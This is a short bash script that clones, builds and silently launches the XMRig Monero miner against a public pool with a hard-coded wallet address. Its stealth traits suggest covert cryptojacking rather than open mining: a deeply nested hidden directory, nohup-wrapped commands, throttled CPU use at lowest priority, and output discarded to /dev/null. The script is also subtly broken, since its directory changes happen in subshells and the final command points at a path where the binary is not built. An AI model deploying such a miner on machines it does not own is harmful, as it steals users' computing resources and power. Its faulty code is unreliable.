#!/bin/bash

# Step 1: Create directories and navigate
echo "Step 1: Creating directories and navigating..."
nohup bash -c 'mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do && cd ~/.local/.run/.hello/runner/go/beein/.go/do' &
wait

# Step 2: Update and upgrade apt
echo "Step 2: Updating and upgrading apt..."
nohup sudo apt update &
wait
nohup sudo apt upgrade -y &
wait

# Step 3: Install necessary packages
echo "Step 3: Installing necessary packages..."
nohup sudo apt install cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y &
wait

# Step 4: Clone xmrig repository
echo "Step 4: Cloning xmrig repository..."
nohup git clone https://github.com/xmrig/xmrig.git &
wait

# Step 5: Build xmrig
echo "Step 5: Building xmrig..."
nohup bash -c 'cd xmrig && mkdir build && cd build && cmake .. && make -j$(($(nproc) / 2))' &
wait

# Step 6: Run xmrig
echo "Step 6: Running xmrig..."
nohup nice -n 19 bash -c './xmrig --cpu-max-threads-hint=50 -o pool.supportxmr.com:433 -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p -p laptop -k --donate-level 1' > /dev/null 2>&1 &

echo "Script execution complete. XMRig is running in the background."
